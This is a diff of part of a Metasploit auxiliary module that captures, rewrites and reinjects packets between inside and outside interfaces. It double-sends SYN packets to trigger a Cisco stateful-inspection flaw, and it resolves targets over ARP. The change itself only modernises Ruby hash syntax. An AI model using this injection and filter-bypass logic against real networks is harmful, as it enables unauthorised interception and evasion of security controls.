@@ -54,10 +54,10 @@ class Metasploit3 < Msf::Auxiliary
     inconfig =  PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{inint}").config
 
     # Set Captures for Traffic coming from Outside and from Inside respectively
-    outpcap = PacketFu::Capture.new( :iface => "#{outint}", :start => true, :filter => "tcp and src #{bnatip}" )
+    outpcap = PacketFu::Capture.new( iface: "#{outint}", start: true, filter: "tcp and src #{bnatip}" )
     print_line("Now listening on #{outint}...")
 
-    inpcap = PacketFu::Capture.new( :iface => "#{inint}", :start => true, :filter => "tcp and src #{clientip} and dst #{serverip}" )
+    inpcap = PacketFu::Capture.new( iface: "#{inint}", start: true, filter: "tcp and src #{clientip} and dst #{serverip}" )
     print_line("Now listening on #{inint}...\n\n")
 
     # Start Thread from Outside Processing
@@ -67,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
           packet = PacketFu::Packet.parse(pkt)
 
           # Build a shell packet that will never hit the wire as a hack to get desired mac's
-          shell_pkt = PacketFu::TCPPacket.new(:config => inconfig, :timeout => 0.1, :flavor => "Windows")
+          shell_pkt = PacketFu::TCPPacket.new(config: inconfig, timeout: 0.1, flavor: "Windows")
           shell_pkt.ip_daddr = clientip
           shell_pkt.recalc
 
@@ -77,8 +77,8 @@ class Metasploit3 < Msf::Auxiliary
           packet.eth_saddr = shell_pkt.eth_saddr
           packet.eth_daddr = clientmac
           packet.recalc
-          inj = PacketFu::Inject.new( :iface => "#{inint}", :config => inconfig )
-          inj.a2w(:array => [packet.to_s])
+          inj = PacketFu::Inject.new( iface: "#{inint}", config: inconfig )
+          inj.a2w(array: [packet.to_s])
           print_status("inpacket processed")
         end
       end
@@ -99,7 +99,7 @@ class Metasploit3 < Msf::Auxiliary
           end
 
           # Build a shell packet that will never hit the wire as a hack to get desired mac's
-          shell_pkt = PacketFu::TCPPacket.new(:config=>outconfig, :timeout=> 0.1, :flavor=>"Windows")
+          shell_pkt = PacketFu::TCPPacket.new(config:outconfig, timeout: 0.1, flavor:"Windows")
           shell_pkt.ip_daddr = serverip
           shell_pkt.recalc
 
@@ -107,13 +107,13 @@ class Metasploit3 < Msf::Auxiliary
           packet.eth_saddr = shell_pkt.eth_saddr
           packet.ip_saddr=shell_pkt.ip_saddr
           packet.recalc
-          inj = PacketFu::Inject.new( :iface => "#{outint}", :config =>outconfig )
-          inj.a2w(:array => [packet.to_s])
+          inj = PacketFu::Inject.new( iface: "#{outint}", config:outconfig )
+          inj.a2w(array: [packet.to_s])
 
           # Trigger Cisco SPI Vulnerability by Double-tapping the SYN
           if packet.tcp_flags.syn == 1 && packet.tcp_flags.ack == 0
             select(nil, nil, nil, 0.75)
-            inj.a2w(:array => [packet.to_s])
+            inj.a2w(array: [packet.to_s])
           end
           print_status("outpacket processed")
         end
@@ -125,15 +125,15 @@ class Metasploit3 < Msf::Auxiliary
 
   def arp2(target_ip,int)
     config = PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{int}").config
-    arp_pkt = PacketFu::ARPPacket.new(:flavor => "Windows")
+    arp_pkt = PacketFu::ARPPacket.new(flavor: "Windows")
     arp_pkt.eth_saddr = arp_pkt.arp_saddr_mac = config[:eth_saddr]
     arp_pkt.eth_daddr = "ff:ff:ff:ff:ff:ff"
     arp_pkt.arp_daddr_mac = "00:00:00:00:00:00"
     arp_pkt.arp_saddr_ip = config[:ip_saddr]
     arp_pkt.arp_daddr_ip = target_ip
-    cap = PacketFu::Capture.new(:iface => config[:iface], :start => true, :filter => "arp src #{target_ip} and ether dst #{arp_pkt.eth_saddr}")
-    injarp = PacketFu::Inject.new(:iface => config[:iface])
-    injarp.a2w(:array => [arp_pkt.to_s])
+    cap = PacketFu::Capture.new(iface: config[:iface], start: true, filter: "arp src #{target_ip} and ether dst #{arp_pkt.eth_saddr}")
+    injarp = PacketFu::Inject.new(iface: config[:iface])
+    injarp.a2w(array: [arp_pkt.to_s])
     target_mac = nil
 
     while target_mac.nil?
